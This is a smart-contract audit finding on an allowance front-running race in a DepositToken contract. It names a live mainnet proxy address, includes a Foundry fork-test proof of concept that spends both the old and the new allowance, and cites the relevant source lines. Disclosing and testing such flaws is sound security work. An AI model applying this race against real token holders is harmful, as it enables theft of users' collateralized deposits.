### Title
DepositToken allowance change can be front-run to spend old and new allowances - (File: `contracts/DepositToken.sol`)

### Summary
`DepositToken` implements unrestricted ERC-20 `approve`, `increaseAllowance`, `decreaseAllowance`, and allowance-consuming `transferFrom` logic, allowing a spender to front-run an allowance reduction and consume both the previous and replacement allowances [1](#0-0) [2](#0-1) .

### Finding Description
When an owner changes an existing nonzero allowance directly with `approve` or reduces it with `decreaseAllowance`, the spender can submit `transferFrom` first and spend the old allowance before the update transaction executes [3](#0-2) [4](#0-3) . After the owner’s update lands, the spender retains the newly configured allowance and can spend it again, so the total amount moved can exceed the owner’s intended final allowance [5](#0-4) .

This is reachable through public `approve`, `decreaseAllowance`, and `transferFrom` calls on deployed deposit-token proxies such as mainnet `USDCDepositToken_Pool1` at `0x1A9551de6d56f7768398a82aA2186624a43d89e3` [6](#0-5) . `transferFrom` only requires the amount to be within the sender’s unlocked balance and current allowance; the `nonReentrant` guard does not prevent ordering two separate transactions around the owner’s allowance update [2](#0-1) [7](#0-6) .

### Impact Explanation
An approved spender can steal deposit-token shares beyond the allowance the owner intended to leave active, and if those shares are unlocked the spender can redeem them through `withdraw` for underlying collateral held by the Treasury [8](#0-7) [9](#0-8) [10](#0-9) . This breaks the allowance invariant that the spender may transfer at most the currently authorized amount and permits direct theft of user collateralized deposits.

### Likelihood Explanation
Exploitation requires a user to replace or reduce an existing spender allowance while that spender monitors the mempool, which is a normal wallet flow because `approve` and `decreaseAllowance` are public and do not first force the spender’s allowance to zero [11](#0-10) . Front-running is explicitly available to an unprivileged attacker, and no governor, keeper, oracle failure, bridge component, or malicious privileged actor is required [2](#0-1) .

### Recommendation
Users and integrations should set allowances to zero before assigning a new nonzero value, or use atomic signed permit-style updates where available [11](#0-10) . At the contract level, remove unrestricted `approve` or replace it with explicit `increaseAllowance`/`decreaseAllowance` semantics that prevent spending the old and replacement values in one race, although this would be an interface-breaking token change [12](#0-11) .

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IDepositTokenRace {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function unlockedBalanceOf(address account) external view returns (uint256);
}

contract DepositTokenAllowanceRaceForkTest is Test {
    IDepositTokenRace constant MSD_USDC =
        IDepositTokenRace(0x1A9551de6d56f7768398a82aA2186624a43d89e3);

    address victim = address(0xA11CE);
    address attacker = address(0xB0B);

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        // Give the victim 200 unlocked deposit-token shares.
        deal(address(MSD_USDC), victim, 200e6);
        assertEq(MSD_USDC.unlockedBalanceOf(victim), 200e6);
    }

    function test_allowanceRaceSpendsOldAndNewAllowance() public {
        // Victim originally authorizes 100 shares.
        vm.prank(victim);
        MSD_USDC.approve(attacker, 100e6);

        // Attacker front-runs the victim's pending approve(attacker, 50e6).
        vm.prank(attacker);
        MSD_USDC.transferFrom(victim, attacker, 100e6);

        // Victim's intended reduction lands, leaving a fresh 50-share allowance.
        vm.prank(victim);
        MSD_USDC.approve(attacker, 50e6);

        // Attacker spends the replacement allowance too: 150 total, not 50.
        vm.prank(attacker);
        MSD_USDC.transferFrom(victim, attacker, 50e6);

        assertEq(MSD_USDC.balanceOf(attacker), 150e6);
        assertEq(MSD_USDC.balanceOf(victim), 50e6);
    }
}
```

### Citations

**File:** contracts/DepositToken.sol (L187-201)
```text
    function approve(address spender_, uint256 amount_) external override returns (bool) {
        _approve(_msgSender(), spender_, amount_);
        return true;
    }

    /**
     * @notice Atomically decrease the allowance granted to `spender` by the caller
     */
    function decreaseAllowance(address spender_, uint256 subtractedValue_) external returns (bool) {
        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[_msgSender][spender_];
        if (_currentAllowance < subtractedValue_) revert DecreasedAllowanceBelowZero();
        unchecked {
            _approve(_msgSender, spender_, _currentAllowance - subtractedValue_);
        }
```

**File:** contracts/DepositToken.sol (L253-259)
```text
     * @notice Atomically increase the allowance granted to `spender` by the caller
     */
    function increaseAllowance(address spender_, uint256 addedValue_) external returns (bool) {
        address _msgSender = _msgSender();
        _approve(_msgSender, spender_, allowance[_msgSender][spender_] + addedValue_);
        return true;
    }
```

**File:** contracts/DepositToken.sol (L348-353)
```text
    function transfer(address to_, uint256 amount_) external override returns (bool) {
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        _transfer(_msgSender, to_, amount_);
        return true;
```

**File:** contracts/DepositToken.sol (L357-373)
```text
    function transferFrom(
        address sender_,
        address recipient_,
        uint256 amount_
    ) external override nonReentrant returns (bool) {
        _revertIfLocked(sender_, amount_);

        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[sender_][_msgSender];
        if (_currentAllowance != type(uint256).max) {
            if (_currentAllowance < amount_) revert AmountExceedsAllowance();
            unchecked {
                _approve(sender_, _msgSender, _currentAllowance - amount_);
            }
        }

        _transfer(sender_, recipient_, amount_);
```

**File:** contracts/DepositToken.sol (L400-411)
```text
    /**
     * @notice Burn msdTOKEN and withdraw collateral
     * @param amount_ The amount of collateral to withdraw
     * @param to_ The account that will receive withdrawn collateral
     * @return _withdrawn The amount withdrawn after fees
     */
    function withdraw(uint256 amount_, address to_) external override returns (uint256 _withdrawn, uint256 _fee) {
        if (to_ == address(0)) revert RecipientIsNull();
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        return _withdraw({account_: _msgSender, amount_: amount_, to_: to_});
```

**File:** deployments/mainnet/USDCDepositToken_Pool1_Proxy.json (L1-3)
```json
{
  "address": "0x1A9551de6d56f7768398a82aA2186624a43d89e3",
  "abi": [
```

**File:** contracts/utils/ReentrancyGuardTransient.sol (L33-50)
```text
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be NOT_ENTERED
        if (_reentrancyGuardEntered()) {
            revert ReentrancyGuardReentrantCall();
        }

        // Any calls to nonReentrant after this point will fail
        REENTRANCY_GUARD_STORAGE.asBoolean().tstore(true);
    }

    function _nonReentrantAfter() private {
        REENTRANCY_GUARD_STORAGE.asBoolean().tstore(false);
```

**File:** contracts/Treasury.sol (L66-72)
```text
    function pull(address to_, uint256 amount_) external override nonReentrant {
        address _msgSender = _msgSender();
        if (!pool.doesDepositTokenExist(IDepositToken(_msgSender))) revert SenderIsNotDepositToken();
        if (to_ == address(0)) revert RecipientIsNull();
        if (amount_ == 0) revert AmountIsZero();
        IDepositToken(_msgSender).underlying().safeTransfer(to_, amount_);
    }
```
